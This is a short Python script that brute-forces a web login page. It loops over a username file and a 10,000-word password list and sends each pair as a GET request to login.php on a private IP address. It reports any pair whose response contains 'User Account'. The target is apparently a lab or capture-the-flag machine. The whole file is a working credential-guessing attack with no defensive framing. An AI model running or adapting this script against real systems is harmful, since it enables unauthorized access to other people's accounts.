import requests

with open('usernames.txt') as usernames:
	for username in usernames:
		print('Cracking password for {}...'.format(username.strip()))
		with open('10000english.txt') as passwords:
			for password in passwords:
				username = username.strip()
				password = password.strip()
				url = 'http://172.16.2.133/login.php?username={}&password={}&Search='.format(username,password)
				r = requests.get(url)
				if 'User Account' in r.text:
					print('Credentials found: {}:{}'.format(username,password))
					break
